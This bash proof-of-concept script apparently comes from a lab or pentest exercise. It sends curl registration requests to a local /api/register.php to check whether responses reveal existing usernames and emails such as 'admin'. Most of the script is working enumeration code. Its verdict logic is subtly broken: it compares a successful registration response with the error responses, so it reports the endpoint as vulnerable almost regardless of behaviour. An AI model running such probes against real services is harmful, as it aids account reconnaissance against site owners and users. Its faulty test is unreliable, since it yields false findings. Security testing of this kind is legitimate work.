#!/bin/bash
# POC: Account Enumeration Testing on /api/register.php
# This script tests if the registration endpoint leaks information about existing accounts

TARGET="http://localhost:8080/api/register.php"
RESPONSE_FILE="/tmp/register_response.json"

echo "[*] Testing /api/register.php for Account Enumeration Vulnerabilities"
echo "[*] Target: $TARGET"
echo ""

# From database schema, we know these users exist:
# - admin, not_that_easy, user1, john_doe, jane_smith, alice_johnson, bob_brown, etc.

echo "[TEST 1] Registering with NEW username and email (should succeed)"
echo "Payload: username=newuser999, email=newuser999@test.com"
curl -s -X POST "$TARGET" \
  -d "username=newuser999&email=newuser999@test.com&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded" | tee "$RESPONSE_FILE"
echo ""
echo ""

echo "[TEST 2] Attempting to register with EXISTING username (should fail with same error)"
echo "Payload: username=admin (KNOWN TO EXIST), email=newemail@test.com"
NEW_USER_ERROR=$(cat "$RESPONSE_FILE")
curl -s -X POST "$TARGET" \
  -d "username=admin&email=newemail@test.com&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded" | tee "$RESPONSE_FILE"
EXISTING_USER_ERROR=$(cat "$RESPONSE_FILE")
echo ""
echo ""

echo "[TEST 3] Attempting to register with EXISTING email (should fail with same error)"
echo "Payload: username=newuser888, email=admin@idoreats.local (KNOWN TO EXIST)"
curl -s -X POST "$TARGET" \
  -d "username=newuser888&email=admin@idoreats.local&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded" | tee "$RESPONSE_FILE"
EXISTING_EMAIL_ERROR=$(cat "$RESPONSE_FILE")
echo ""
echo ""

echo "[*] Account Enumeration Analysis:"
echo "=========================================="
if [ "$NEW_USER_ERROR" = "$EXISTING_USER_ERROR" ]; then
    echo "✓ SECURE: Error messages are identical for new vs existing username"
    echo "  Both new and existing user registration attempts return same error"
else
    echo "✗ VULNERABLE: Error messages differ!"
    echo "  New user error: $NEW_USER_ERROR"
    echo "  Existing user error: $EXISTING_USER_ERROR"
fi
echo ""

if [ "$NEW_USER_ERROR" = "$EXISTING_EMAIL_ERROR" ]; then
    echo "✓ SECURE: Error messages are identical for new vs existing email"
else
    echo "✗ VULNERABLE: Error messages differ for email enumeration!"
    echo "  New user error: $NEW_USER_ERROR"
    echo "  Existing email error: $EXISTING_EMAIL_ERROR"
fi
echo ""

echo "[*] Enumeration Testing Complete"
